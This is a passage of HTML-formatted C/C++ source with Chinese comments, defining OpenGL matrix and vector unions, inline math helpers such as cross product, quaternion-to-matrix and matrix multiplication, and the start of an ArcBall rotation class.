<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M20; GLfloat XZ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M01; GLfloat YX;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M11; GLfloat YY; GLfloat SY; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M21; GLfloat YZ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M02; GLfloat ZX;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M12; GLfloat ZY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M22; GLfloat ZZ; GLfloat SZ; };&nbsp; <br>&nbsp;&nbsp;&nbsp; } s;<br>&nbsp;&nbsp;&nbsp; GLfloat M[9];<br>} Matrix3fT;&nbsp;&nbsp;&nbsp; <br><br>//4x4矩阵<br>typedef union Matrix4f_t<br>{<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //column major<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M00; GLfloat XX; GLfloat SX; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M10; GLfloat XY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M20; GLfloat XZ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M30; GLfloat XW;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M01; GLfloat YX;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M11; GLfloat YY; GLfloat SY; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M21; GLfloat YZ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M31; GLfloat YW;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M02; GLfloat ZX;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M12; GLfloat ZY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M22; GLfloat ZZ; GLfloat SZ; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M32; GLfloat ZW;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M03; GLfloat TX;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M13; GLfloat TY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M23; GLfloat TZ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M33; GLfloat TW; GLfloat SW; };&nbsp; <br>&nbsp;&nbsp;&nbsp; } s;<br>&nbsp;&nbsp;&nbsp; GLfloat M[16];<br>} Matrix4fT;&nbsp;&nbsp;&nbsp; <br><br><br>//定义类型的别名<br>#define Point2fT&nbsp;&nbsp;&nbsp; Tuple2fT&nbsp;&nbsp; <br>#define Quat4fT&nbsp;&nbsp;&nbsp;&nbsp; Tuple4fT&nbsp;&nbsp; <br>#define Vector2fT&nbsp;&nbsp; Tuple2fT&nbsp;&nbsp; <br>#define Vector3fT&nbsp;&nbsp; Tuple3fT&nbsp;&nbsp; <br>#define FuncSqrt&nbsp;&nbsp;&nbsp; sqrtf<br># define Epsilon 1.0e-5<br><br>//2维点相加<br>inline<br>static void Point2fAdd(Point2fT* NewObj, const Tuple2fT* t1)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; t1);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.X += t1-&gt;s.X;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.Y += t1-&gt;s.Y;<br>}<br><br>//2维点相减<br>inline<br>static void Point2fSub(Point2fT* NewObj, const Tuple2fT* t1)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; t1);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.X -= t1-&gt;s.X;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.Y -= t1-&gt;s.Y;<br>}<br><br>//3维点矢积<br>inline<br>static void Vector3fCross(Vector3fT* NewObj, const Vector3fT* v1, const Vector3fT* v2)<br>{<br>&nbsp;&nbsp;&nbsp; Vector3fT Result; <br><br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; v1 &amp;&amp; v2);<br><br>&nbsp;&nbsp;&nbsp; Result.s.X = (v1-&gt;s.Y * v2-&gt;s.Z) - (v1-&gt;s.Z * v2-&gt;s.Y);<br>&nbsp;&nbsp;&nbsp; Result.s.Y = (v1-&gt;s.Z * v2-&gt;s.X) - (v1-&gt;s.X * v2-&gt;s.Z);<br>&nbsp;&nbsp;&nbsp; Result.s.Z = (v1-&gt;s.X * v2-&gt;s.Y) - (v1-&gt;s.Y * v2-&gt;s.X);<br><br>&nbsp;&nbsp;&nbsp; *NewObj = Result;<br>}<br><br>//3维点点积<br>inline<br>static GLfloat Vector3fDot(const Vector3fT* NewObj, const Vector3fT* v1)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; v1);<br><br>&nbsp;&nbsp;&nbsp; return&nbsp; (NewObj-&gt;s.X * v1-&gt;s.X) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.Y * v1-&gt;s.Y) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.Z * v1-&gt;s.Z);<br>}<br><br>//3维点的长度的平方<br>inline<br>static GLfloat Vector3fLengthSquared(const Vector3fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj);<br><br>&nbsp;&nbsp;&nbsp; return&nbsp; (NewObj-&gt;s.X * NewObj-&gt;s.X) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.Y * NewObj-&gt;s.Y) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.Z * NewObj-&gt;s.Z);<br>}<br><br>//3维点的长度<br>inline<br>static GLfloat Vector3fLength(const Vector3fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj);<br><br>&nbsp;&nbsp;&nbsp; return FuncSqrt(Vector3fLengthSquared(NewObj));<br>}<br><br>//设置3x3矩阵为0矩阵<br>inline<br>static void Matrix3fSetZero(Matrix3fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M00 = NewObj-&gt;s.M01 = NewObj-&gt;s.M02 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M10 = NewObj-&gt;s.M11 = NewObj-&gt;s.M12 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M20 = NewObj-&gt;s.M21 = NewObj-&gt;s.M22 = 0.0f;<br>}<br><br>//设置4x4矩阵为0矩阵<br>inline<br>static void Matrix4fSetZero(Matrix4fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M00 = NewObj-&gt;s.M01 = NewObj-&gt;s.M02 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M10 = NewObj-&gt;s.M11 = NewObj-&gt;s.M12 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M20 = NewObj-&gt;s.M21 = NewObj-&gt;s.M22 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M30 = NewObj-&gt;s.M31 = NewObj-&gt;s.M32 = 0.0f;<br>}<br><br>//设置3x3矩阵为单位矩阵<br>inline<br>static void Matrix3fSetIdentity(Matrix3fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; Matrix3fSetZero(NewObj);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M00 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M11 = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewObj-&gt;s.M22 = 1.0f;<br>}<br><br>//设置4x4矩阵为单位矩阵<br>inline<br>static void Matrix4fSetIdentity(Matrix4fT* NewObj)<br>{<br>&nbsp;&nbsp;&nbsp; Matrix4fSetZero(NewObj);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M00 = 1.0f;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M11 = 1.0f;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M22 = 1.0f;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.M33=1.0f;<br>}<br><br>//从四元数设置旋转矩阵<br>inline<br>static void Matrix3fSetRotationFromQuat4f(Matrix3fT* NewObj, const Quat4fT* q1)<br>{<br>&nbsp;&nbsp;&nbsp; GLfloat n, s;<br>&nbsp;&nbsp;&nbsp; GLfloat xs, ys, zs;<br>&nbsp;&nbsp;&nbsp; GLfloat wx, wy, wz;<br>&nbsp;&nbsp;&nbsp; GLfloat xx, xy, xz;<br>&nbsp;&nbsp;&nbsp; GLfloat yy, yz, zz;<br><br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; q1);<br><br>&nbsp;&nbsp;&nbsp; n = (q1-&gt;s.X * q1-&gt;s.X) + (q1-&gt;s.Y * q1-&gt;s.Y) + (q1-&gt;s.Z * q1-&gt;s.Z) + (q1-&gt;s.W * q1-&gt;s.W);<br>&nbsp;&nbsp;&nbsp; s = (n &gt; 0.0f) ? (2.0f / n) : 0.0f;<br><br>&nbsp;&nbsp;&nbsp; xs = q1-&gt;s.X * s;&nbsp; ys = q1-&gt;s.Y * s;&nbsp; zs = q1-&gt;s.Z * s;<br>&nbsp;&nbsp;&nbsp; wx = q1-&gt;s.W * xs; wy = q1-&gt;s.W * ys; wz = q1-&gt;s.W * zs;<br>&nbsp;&nbsp;&nbsp; xx = q1-&gt;s.X * xs; xy = q1-&gt;s.X * ys; xz = q1-&gt;s.X * zs;<br>&nbsp;&nbsp;&nbsp; yy = q1-&gt;s.Y * ys; yz = q1-&gt;s.Y * zs; zz = q1-&gt;s.Z * zs;<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XX = 1.0f - (yy + zz); NewObj-&gt;s.YX =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xy - wz;&nbsp; NewObj-&gt;s.ZX =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xz + wy;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XY =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xy + wz;&nbsp; NewObj-&gt;s.YY = 1.0f - (xx + zz); NewObj-&gt;s.ZY =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yz - wx;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XZ =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xz - wy;&nbsp; NewObj-&gt;s.YZ =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yz + wx;&nbsp; NewObj-&gt;s.ZZ = 1.0f - (xx + yy);<br>}<br><br>//3x3矩阵相乘<br>inline<br>static void Matrix3fMulMatrix3f(Matrix3fT* NewObj, const Matrix3fT* m1)<br>{<br>&nbsp;&nbsp;&nbsp; Matrix3fT Result; <br><br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; m1);<br><br>&nbsp;&nbsp;&nbsp; Result.s.M00 = (NewObj-&gt;s.M00 * m1-&gt;s.M00) + (NewObj-&gt;s.M01 * m1-&gt;s.M10) + (NewObj-&gt;s.M02 * m1-&gt;s.M20);<br>&nbsp;&nbsp;&nbsp; Result.s.M01 = (NewObj-&gt;s.M00 * m1-&gt;s.M01) + (NewObj-&gt;s.M01 * m1-&gt;s.M11) + (NewObj-&gt;s.M02 * m1-&gt;s.M21);<br>&nbsp;&nbsp;&nbsp; Result.s.M02 = (NewObj-&gt;s.M00 * m1-&gt;s.M02) + (NewObj-&gt;s.M01 * m1-&gt;s.M12) + (NewObj-&gt;s.M02 * m1-&gt;s.M22);<br><br>&nbsp;&nbsp;&nbsp; Result.s.M10 = (NewObj-&gt;s.M10 * m1-&gt;s.M00) + (NewObj-&gt;s.M11 * m1-&gt;s.M10) + (NewObj-&gt;s.M12 * m1-&gt;s.M20);<br>&nbsp;&nbsp;&nbsp; Result.s.M11 = (NewObj-&gt;s.M10 * m1-&gt;s.M01) + (NewObj-&gt;s.M11 * m1-&gt;s.M11) + (NewObj-&gt;s.M12 * m1-&gt;s.M21);<br>&nbsp;&nbsp;&nbsp; Result.s.M12 = (NewObj-&gt;s.M10 * m1-&gt;s.M02) + (NewObj-&gt;s.M11 * m1-&gt;s.M12) + (NewObj-&gt;s.M12 * m1-&gt;s.M22);<br><br>&nbsp;&nbsp;&nbsp; Result.s.M20 = (NewObj-&gt;s.M20 * m1-&gt;s.M00) + (NewObj-&gt;s.M21 * m1-&gt;s.M10) + (NewObj-&gt;s.M22 * m1-&gt;s.M20);<br>&nbsp;&nbsp;&nbsp; Result.s.M21 = (NewObj-&gt;s.M20 * m1-&gt;s.M01) + (NewObj-&gt;s.M21 * m1-&gt;s.M11) + (NewObj-&gt;s.M22 * m1-&gt;s.M21);<br>&nbsp;&nbsp;&nbsp; Result.s.M22 = (NewObj-&gt;s.M20 * m1-&gt;s.M02) + (NewObj-&gt;s.M21 * m1-&gt;s.M12) + (NewObj-&gt;s.M22 * m1-&gt;s.M22);<br><br>&nbsp;&nbsp;&nbsp; *NewObj = Result;<br>}<br><br>//4x4矩阵相乘<br>inline<br>static void Matrix4fSetRotationScaleFromMatrix4f(Matrix4fT* NewObj, const Matrix4fT* m1)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; m1);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XX = m1-&gt;s.XX; NewObj-&gt;s.YX = m1-&gt;s.YX; NewObj-&gt;s.ZX = m1-&gt;s.ZX;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XY = m1-&gt;s.XY; NewObj-&gt;s.YY = m1-&gt;s.YY; NewObj-&gt;s.ZY = m1-&gt;s.ZY;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XZ = m1-&gt;s.XZ; NewObj-&gt;s.YZ = m1-&gt;s.YZ; NewObj-&gt;s.ZZ = m1-&gt;s.ZZ;<br>}<br><br>//进行矩阵的奇异值分解，旋转矩阵被保存到rot3和rot4中，返回矩阵的缩放因子<br>inline<br>static GLfloat Matrix4fSVD(const Matrix4fT* NewObj, Matrix3fT* rot3, Matrix4fT* rot4)<br>{<br>&nbsp;&nbsp;&nbsp; GLfloat s, n;<br><br>&nbsp;&nbsp;&nbsp; assert(NewObj);<br><br>&nbsp;&nbsp;&nbsp; s = FuncSqrt(<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ( (NewObj-&gt;s.XX * NewObj-&gt;s.XX) + (NewObj-&gt;s.XY * NewObj-&gt;s.XY) + (NewObj-&gt;s.XZ * NewObj-&gt;s.XZ) + <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.YX * NewObj-&gt;s.YX) + (NewObj-&gt;s.YY * NewObj-&gt;s.YY) + (NewObj-&gt;s.YZ * NewObj-&gt;s.YZ) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.ZX * NewObj-&gt;s.ZX) + (NewObj-&gt;s.ZY * NewObj-&gt;s.ZY) + (NewObj-&gt;s.ZZ * NewObj-&gt;s.ZZ) ) / 3.0f );<br><br>&nbsp;&nbsp;&nbsp; if (rot3)&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.XX = NewObj-&gt;s.XX; rot3-&gt;s.XY = NewObj-&gt;s.XY; rot3-&gt;s.XZ = NewObj-&gt;s.XZ;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.YX = NewObj-&gt;s.YX; rot3-&gt;s.YY = NewObj-&gt;s.YY; rot3-&gt;s.YZ = NewObj-&gt;s.YZ;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.ZX = NewObj-&gt;s.ZX; rot3-&gt;s.ZY = NewObj-&gt;s.ZY; rot3-&gt;s.ZZ = NewObj-&gt;s.ZZ;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.XX * NewObj-&gt;s.XX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.XY * NewObj-&gt;s.XY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.XZ * NewObj-&gt;s.XZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.XX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.XY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.XZ *= n;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.YX * NewObj-&gt;s.YX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.YY * NewObj-&gt;s.YY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.YZ * NewObj-&gt;s.YZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.YX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.YY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.YZ *= n;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.ZX * NewObj-&gt;s.ZX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.ZY * NewObj-&gt;s.ZY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.ZZ * NewObj-&gt;s.ZZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.ZX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.ZY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot3-&gt;s.ZZ *= n;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; if (rot4)&nbsp; <br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (rot4 != NewObj)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Matrix4fSetRotationScaleFromMatrix4f(rot4, NewObj); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.XX * NewObj-&gt;s.XX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.XY * NewObj-&gt;s.XY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.XZ * NewObj-&gt;s.XZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.XX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.XY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.XZ *= n;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.YX * NewObj-&gt;s.YX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.YY * NewObj-&gt;s.YY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.YZ * NewObj-&gt;s.YZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.YX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.YY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.YZ *= n;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n = 1.0f / FuncSqrt( (NewObj-&gt;s.ZX * NewObj-&gt;s.ZX) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.ZY * NewObj-&gt;s.ZY) +<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (NewObj-&gt;s.ZZ * NewObj-&gt;s.ZZ) );<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.ZX *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.ZY *= n;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rot4-&gt;s.ZZ *= n;<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; return s;<br>}<br><br>//从3x3矩阵变为4x4的旋转矩阵<br>inline<br>static void Matrix4fSetRotationScaleFromMatrix3f(Matrix4fT* NewObj, const Matrix3fT* m1)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; m1);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XX = m1-&gt;s.XX; NewObj-&gt;s.YX = m1-&gt;s.YX; NewObj-&gt;s.ZX = m1-&gt;s.ZX;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XY = m1-&gt;s.XY; NewObj-&gt;s.YY = m1-&gt;s.YY; NewObj-&gt;s.ZY = m1-&gt;s.ZY;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XZ = m1-&gt;s.XZ; NewObj-&gt;s.YZ = m1-&gt;s.YZ; NewObj-&gt;s.ZZ = m1-&gt;s.ZZ;<br>}<br><br>//4x4矩阵的与标量的乘积<br>inline<br>static void Matrix4fMulRotationScale(Matrix4fT* NewObj, GLfloat scale)<br>{<br>&nbsp;&nbsp;&nbsp; assert(NewObj);<br><br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XX *= scale; NewObj-&gt;s.YX *= scale; NewObj-&gt;s.ZX *= scale;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XY *= scale; NewObj-&gt;s.YY *= scale; NewObj-&gt;s.ZY *= scale;<br>&nbsp;&nbsp;&nbsp; NewObj-&gt;s.XZ *= scale; NewObj-&gt;s.YZ *= scale; NewObj-&gt;s.ZZ *= scale;<br>}<br><br>//设置旋转矩阵<br>inline<br>static void Matrix4fSetRotationFromMatrix3f(Matrix4fT* NewObj, const Matrix3fT* m1)<br>{<br>&nbsp;&nbsp;&nbsp; GLfloat scale;<br><br>&nbsp;&nbsp;&nbsp; assert(NewObj &amp;&amp; m1);<br><br>&nbsp;&nbsp;&nbsp; scale = Matrix4fSVD(NewObj, NULL, NULL);<br><br>&nbsp;&nbsp;&nbsp; Matrix4fSetRotationScaleFromMatrix3f(NewObj, m1);<br>&nbsp;&nbsp;&nbsp; Matrix4fMulRotationScale(NewObj, scale);<br>}<br><br><br><br>typedef class ArcBall_t<br>{<br>protected:<br>&nbsp;&nbsp;&nbsp; //把二维点映射到三维点<br>&nbsp;&nbsp;&nbsp; inline<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; void _mapToSphere(const Point2fT* NewPt, Vector3fT* NewVec) const;<br><br>public:<br>&nbsp;&nbsp;&nbsp; //构造/析构函数<br>&nbsp;&nbsp;&nbsp; ArcBall_t(GLfloat NewWidth, GLfloat NewHeight);<br>&nbsp;&nbsp;&nbsp; ~ArcBall_t() { };<br><br>&nbsp;&nbsp;&nbsp; //设置边界<br>&nbsp;&nbsp;&nbsp; inline<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp; setBounds(GLfloat NewWidth, GLfloat NewHeight)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; assert((NewWidth &gt; 1.0f) &amp;&amp; (NewHeight &gt; 1.0f));<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置长宽的调整因子<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;AdjustWidth&nbsp; = 1.0f / ((NewWidth&nbsp; - 1.0f) * 0.5f);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;AdjustHeight = 1.0f / ((NewHeight - 1.0f) * 0.5f);<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; //鼠标点击<br>&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp; click(const Point2fT* NewPt);<br><br>&nbsp;&nbsp;&nbsp; 